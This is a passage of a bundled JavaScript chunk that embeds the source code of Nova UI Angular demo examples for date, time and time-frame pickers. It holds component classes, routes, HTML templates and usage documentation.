this.selectedPresetKeyDatePicker = this.getPresetFromDate(value); // will return undefined if not found, exactly what\'s needed\n            this.confirmPopoverDatePicker();\n        }\n    }\n\n    private getDefaultPresets(): { [key: string]: any } {\n        return {\n            today: { name: "Today", pattern: () => moment() },\n            yesterday: {\n                name: "Yesterday",\n                pattern: () => moment().subtract(1, "days"),\n            },\n            dimasBirthday: {\n                name: "Dima\'s Birthday",\n                pattern: () => moment("1986-02-17"),\n            },\n            random: {\n                name: "Random date (to show that we can)",\n                pattern: () =>\n                    moment(\n                        +new Date() - Math.floor(Math.random() * 100000000000)\n                    ),\n            },\n        };\n    }\n\n    private getDateFromPreset(presetKey: string): Moment {\n        const preset = this.getDefaultPresets()[presetKey];\n        return preset ? preset.pattern() : moment();\n    }\n\n    private getPresetFromDate(date: Moment): string {\n        const preset: string | undefined = _find(\n            Object.keys(this.presets),\n            (key) => date.isSame(this.getDateFromPreset(key), "day")\n        );\n        if (_isUndefined(preset)) {\n            throw new Error("DatePreset was not found");\n        }\n        return preset;\n    }\n}\n'},25151:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { NgModule } from "@angular/core";\nimport { FormsModule } from "@angular/forms";\nimport { RouterModule } from "@angular/router";\n\nimport {\n    DEMO_PATH_TOKEN,\n    NuiButtonModule,\n    NuiDatePickerModule,\n    NuiDialogModule,\n    NuiDividerModule,\n    NuiDocsModule,\n    NuiMessageModule,\n    NuiPopoverModule,\n    NuiTextboxModule,\n    NuiTimeFramePickerModule,\n    SrlcStage,\n} from "@nova-ui/bits";\n\nimport {\n    QuickPickerBasicExampleComponent,\n    TimeFramePickerBasicExampleComponent,\n    TimeFramePickerCustomExampleComponent,\n    TimeFramePickerDateExampleComponent,\n    TimeFramePickerDocsExampleComponent,\n    TimeFramePickerInlineExampleComponent,\n    TimeFramePickerMultipleCustomPickersExampleComponent,\n    TimeFramePickerTestExampleComponent,\n    TimeFramePickerVisualTestComponent,\n    TimeframeServiceScoperExampleComponent,\n} from "./index";\nimport { getDemoFiles } from "../../../static/demo-files-factory";\n\nconst routes = [\n    {\n        path: "",\n        component: TimeFramePickerDocsExampleComponent,\n        data: {\n            srlc: {\n                stage: SrlcStage.ga,\n            },\n            showThemeSwitcher: true,\n        },\n    },\n    {\n        path: "time-frame-picker-test",\n        component: TimeFramePickerTestExampleComponent,\n        data: {\n            srlc: {\n                hideIndicator: true,\n            },\n        },\n    },\n    {\n        path: "time-frame-picker-visual-test",\n        component: TimeFramePickerVisualTestComponent,\n        data: {\n            srlc: {\n                hideIndicator: true,\n            },\n        },\n    },\n    {\n        path: "multiple-custom-pickers",\n        component: TimeFramePickerMultipleCustomPickersExampleComponent,\n        data: {\n            srlc: {\n                hideIndicator: true,\n            },\n        },\n    },\n];\n\n@NgModule({\n    imports: [\n        NuiButtonModule,\n        NuiTimeFramePickerModule,\n        NuiDividerModule,\n        NuiMessageModule,\n        FormsModule,\n        NuiPopoverModule,\n        NuiDocsModule,\n        NuiTextboxModule,\n        RouterModule.forChild(routes),\n        NuiDialogModule,\n        NuiDatePickerModule,\n    ],\n    declarations: [\n        QuickPickerBasicExampleComponent,\n        TimeFramePickerBasicExampleComponent,\n        TimeFramePickerCustomExampleComponent,\n        TimeFramePickerDateExampleComponent,\n        TimeFramePickerInlineExampleComponent,\n        TimeFramePickerTestExampleComponent,\n        TimeFramePickerDocsExampleComponent,\n        TimeFramePickerVisualTestComponent,\n        TimeFramePickerMultipleCustomPickersExampleComponent,\n        TimeframeServiceScoperExampleComponent,\n    ],\n    providers: [\n        {\n            provide: DEMO_PATH_TOKEN,\n            useValue: getDemoFiles("time-frame-picker"),\n        },\n    ],\n    exports: [RouterModule],\n})\nexport default class TimeFramePickerModule {}\n'},3483:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nexport * from "./time-picker-docs/time-picker-docs.example.component";\nexport * from "./time-picker-basic/time-picker-basic.example.component";\nexport * from "./time-picker-disabled/time-picker-disabled.example.component";\nexport * from "./time-picker-custom-format/time-picker-custom-format.example.component";\nexport * from "./time-picker-custom-step/time-picker-custom-step.example.component";\nexport * from "./time-picker-localized/time-picker-localized.example.component";\nexport * from "./time-picker-reactive-form/time-picker-reactive-form.example.component";\nexport * from "./time-picker-preserve-isignificant/time-picker-preserve-insignificant.example.component";\nexport * from "./time-picker-model-change/time-picker-model-change.example.component";\nexport * from "./time-picker-visual-test/time-picker-visual-test.component";\n'},73105:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-time-picker id="nui-demo-timepicker-basic"></nui-time-picker>\n'},19485:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-time-picker-basic",\n    templateUrl: "./time-picker-basic.example.component.html",\n})\nexport class TimePickerBasicExampleComponent {}\n'},68825:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-time-picker\n    id="nui-demo-timepicker-custom-format"\n    timeFormat="h:mm:ss"\n></nui-time-picker>\n'},66645:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-time-picker-custom-format",\n    templateUrl: "./time-picker-custom-format.example.component.html",\n})\nexport class TimePickerCustomFormatExampleComponent {}\n'},51473:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-time-picker [timeStep]="10"></nui-time-picker>\n'},19997:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-time-picker-custom-step",\n    templateUrl: "./time-picker-custom-step.example.component.html",\n})\nexport class TimePickerCustomStepExampleComponent {}\n'},38009:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-time-picker\n    id="nui-demo-timepicker-disabled"\n    [isDisabled]="true"\n></nui-time-picker>\n'},7285:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-time-picker-disabled",\n    templateUrl: "./time-picker-disabled.example.component.html",\n})\nexport class TimePickerDisabledExampleComponent {}\n'},12979:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<h2>Required Modules</h2>\n<ul>\n    <li>\n        <code>NuiTimePickerModule</code>\n    </li>\n</ul>\n<h2>Basic Usage</h2>\n<p>\n    To use the time picker add an <code>&lt;nui-time-picker&gt;</code> element\n    to your template.\n</p>\n<nui-example-wrapper\n    filenamePrefix="time-picker-basic"\n    exampleTitle="Basic Usage"\n>\n    <nui-time-picker-basic></nui-time-picker-basic>\n</nui-example-wrapper>\n\n<h2>Binding to Model Changes</h2>\n<p>\n    The <code>[model]</code> input represents the model of the time picker. To\n    get the selected time, bind to the <code>(timeChanged)</code> output which\n    emits a <code>moment() object</code>.\n</p>\n<nui-example-wrapper\n    filenamePrefix="time-picker-model-change"\n    exampleTitle="Changing Model"\n>\n    <nui-time-picker-model-change></nui-time-picker-model-change>\n</nui-example-wrapper>\n\n<h2>Emitting the Day and Year</h2>\n<p>\n    To have <code>(timeChanged)</code> emit the current day and year in addition\n    to the time, set the <code>[preserveInsignificant]</code> input to true.\n</p>\n<nui-example-wrapper\n    filenamePrefix="time-picker-preserve-insignificant"\n    exampleTitle="Emitting Day and Year"\n>\n    <nui-time-picker-preserve-insignificant></nui-time-picker-preserve-insignificant>\n</nui-example-wrapper>\n\n<h2>Setting Disabled</h2>\n<p>\n    To disable the time-picker, set the <code>[isDisabled]</code> input to true.\n</p>\n<nui-example-wrapper\n    filenamePrefix="time-picker-disabled"\n    exampleTitle="Setting Disabled"\n>\n    <nui-time-picker-disabled></nui-time-picker-disabled>\n</nui-example-wrapper>\n\n<h2>Setting a Custom Time Format</h2>\n<p>\n    A custom time format can be applied via the <code>timeFormat</code> input.\n    The default format is "LT".\n</p>\n<nui-example-wrapper\n    filenamePrefix="time-picker-custom-format"\n    exampleTitle="Custom Time Format"\n>\n    <nui-time-picker-custom-format></nui-time-picker-custom-format>\n</nui-example-wrapper>\n\n<h2>Setting a Custom Time Step</h2>\n<p>\n    A custom time step (the interval in minutes between selectable times) can be\n    applied via the <code>timeStep</code> input. The default time step is "30".\n</p>\n<nui-example-wrapper\n    filenamePrefix="time-picker-custom-step"\n    exampleTitle="Custom Time Step"\n>\n    <nui-time-picker-custom-step></nui-time-picker-custom-step>\n</nui-example-wrapper>\n\n<h2>Using with Reactive Forms</h2>\n<p>\n    To use <code>&lt;nui-time-picker&gt;</code> in a reactive form, create a\n    <code>FormGroup</code> that represents the form model. Then, bind\n    <code>&lt;nui-time-picker&gt;</code> to a form element using the\n    <code>formControlName</code>\n    attribute.\n</p>\n<nui-example-wrapper\n    filenamePrefix="time-picker-reactive-form"\n    exampleTitle="Reactive Form"\n>\n    <nui-time-picker-reactive-form></nui-time-picker-reactive-form>\n</nui-example-wrapper>\n'},45995:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-time-picker-docs",\n    templateUrl: "./time-picker-docs.example.component.html",\n})\nexport class TimePickerDocsExampleComponent {}\n'},59005:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<h2>Time Picker</h2>\n<nui-time-picker></nui-time-picker>\n\n<h2>Date Time Picker</h2>\n<nui-date-time-picker></nui-date-time-picker>\n\n<h2>Time Frame Bar</h2>\n<nui-time-frame-bar\n    [minDate]="minDate"\n    [maxDate]="maxDate"\n    [(timeFrame)]="timeFrame"\n>\n    <nui-icon icon="calendar" class="pr-3"></nui-icon>\n    {{ timeFrame | timeFrame }}\n\n    <nui-quick-picker timeFrameSelection>\n        <nui-time-frame-picker></nui-time-frame-picker>\n    </nui-quick-picker>\n</nui-time-frame-bar>\n'},6025:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, OnDestroy, OnInit } from "@angular/core";\nimport moment, { Moment } from "moment/moment";\n\nimport { ITimeframe } from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-time-picker-localized",\n    templateUrl: "./time-picker-localized.example.component.html",\n})\nexport class TimePickerLocalizedExampleComponent implements OnInit, OnDestroy {\n    public minDate: Moment;\n    public maxDate: Moment;\n    public timeFrame: ITimeframe;\n\n    private baseDate: Moment;\n    private oldLocale: string;\n\n    public ngOnInit(): void {\n        this.oldLocale = moment.locale();\n        moment.locale(window.navigator.language);\n\n        this.baseDate = moment([2018, 5, 1, 15, 0, 0]);\n        this.minDate = this.baseDate.clone().subtract(1, "months");\n        this.maxDate = moment();\n\n        this.timeFrame = {\n            startDatetime: this.baseDate.clone().subtract(1, "weeks"),\n            endDatetime: this.baseDate.clone(),\n            // @ts-ignore\n            selectedPresetId: null,\n        };\n    }\n\n    public ngOnDestroy(): void {\n        moment.locale(this.oldLocale);\n    }\n}\n'},95521:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-time-picker\n    [model]="time"\n    (timeChanged)="valueChange($event)"\n></nui-time-picker>\n'},74637:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, Inject } from "@angular/core";\nimport moment, { Moment } from "moment/moment";\n\nimport { ToastService } from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-time-picker-model-change",\n    templateUrl: "./time-picker-model-change.example.component.html",\n})\nexport class TimePickerModelChangeExampleComponent {\n    public time: Moment;\n    constructor(@Inject(ToastService) private toastService: ToastService) {\n        this.time = moment("01:20 AM", "HH:mm a");\n    }\n    public valueChange(time: any): void {\n        this.time = time;\n        this.toastService.info({\n            message: $localize`Selected time is: ` + this.time.toString(),\n        });\n    }\n}\n'},91683:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-time-picker\n    [model]="time"\n    [preserveInsignificant]="true"\n    (timeChanged)="valueChange($event)"\n></nui-time-picker>\n'},51675:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, Inject } from "@angular/core";\nimport moment, { Moment } from "moment/moment";\n\nimport { ToastService } from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-time-picker-preserve-insignificant",\n    templateUrl: "./time-picker-preserve-insignificant.example.component.html",\n})\nexport class TimePickerPreserveInsignificantExampleComponent {\n    public time: Moment;\n\n    constructor(@Inject(ToastService) private toastService: ToastService) {\n        this.time = moment();\n    }\n\n    public valueChange(time: any): void {\n        this.time = time;\n        this.toastService.info({\n            message: $localize`Selected time is: ` + this.time.toString(),\n        });\n    }\n}\n'},20993:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<form [formGroup]="myForm" (submit)="onSubmit()">\n    <div class="form-group">\n        <nui-time-picker\n            formControlName="timePickerFormControl"\n            [isInErrorState]="\n                myForm.controls[\'timePickerFormControl\'].invalid &&\n                myForm.controls[\'timePickerFormControl\'].touched\n            "\n            (timeChanged)="valueChange($event)"\n        ></nui-time-picker>\n        <button nui-button type="submit" class="mt-1" i18n>Submit</button>\n    </div>\n</form>\n'},67725:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, Inject, OnInit } from "@angular/core";\nimport {\n    FormBuilder,\n    FormControl,\n    FormGroup,\n    Validators,\n} from "@angular/forms";\nimport { Moment } from "moment/moment";\n\nimport { ToastService } from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-time-picker-reactive-form",\n    templateUrl: "./time-picker-reactive-form.example.component.html",\n})\nexport class TimePickerReactiveFormExampleComponent implements OnInit {\n    public time: Moment;\n    public myForm: FormGroup<{\n        timePickerFormControl: FormControl<Moment | null>;\n    }>;\n\n    constructor(\n        private formBuilder: FormBuilder,\n        @Inject(ToastService) private toastService: ToastService\n    ) {}\n\n    public ngOnInit(): void {\n        this.myForm = this.formBuilder.group({\n            timePickerFormControl: this.formBuilder.control(this.time, [\n                Validators.required,\n            ]),\n        });\n    }\n\n    public valueChange(time: any): void {\n        this.time = time;\n    }\n\n    public onSubmit(): void {\n        if (this.myForm.valid) {\n            this.toastService.success({ message: `Your form is valid!` });\n        } else {\n            this.toastService.error({ message: `Your form is invalid!` });\n        }\n    }\n}\n'},49657:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="container">\n    <div class="row">\n        <div class="col">\n            <h3>Basic TimePicker</h3>\n            <nui-time-picker\n                [model]="myTime"\n                id="nui-visual-test-timepicker-basic"\n            ></nui-time-picker>\n            <hr />\n        </div>\n        <div class="col">\n            <h3>Disabled TimePicker</h3>\n            <nui-time-picker\n                [model]="myTime"\n                id="nui-visual-test-timepicker-disabled"\n                [isDisabled]="true"\n            ></nui-time-picker>\n            <hr />\n        </div>\n        <div class="w-100"></div>\n        <div class="col">\n            <h3>TimePicker with Custom Format</h3>\n            <nui-time-picker\n                [model]="myTime"\n                id="nui-visual-test-custom-format-timepicker"\n                timeFormat="h:mm:ss"\n            ></nui-time-picker>\n            <hr />\n        </div>\n        <div class="col">\n            <h3>TimePicker with Custom Step</h3>\n            <nui-time-picker\n                [model]="myTime"\n                id="nui-visual-test-custom-step-timepicker"\n                [timeStep]="10"\n            ></nui-time-picker>\n            <hr />\n        </div>\n        <div class="w-100"></div>\n        <div class="col-6">\n            <h3>Using TimePicker with Validation</h3>\n            <form [formGroup]="myForm">\n                <div class="form-group">\n                    <nui-time-picker\n                        [model]="myTime"\n                        id="nui-visual-test-required-timepicker"\n                        formControlName="timePickerFormControl"\n                        [isInErrorState]="\n                            myForm.controls[\'timePickerFormControl\'].invalid\n                        "\n                        (timeChanged)="valueChange($event)"\n                    >\n                    </nui-time-picker>\n                </div>\n            </form>\n            <hr />\n        </div>\n    </div>\n</div>\n'},99477:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, OnInit } from "@angular/core";\nimport {\n    FormBuilder,\n    FormControl,\n    FormGroup,\n    Validators,\n} from "@angular/forms";\nimport moment, { Moment } from "moment/moment";\n\n@Component({\n    selector: 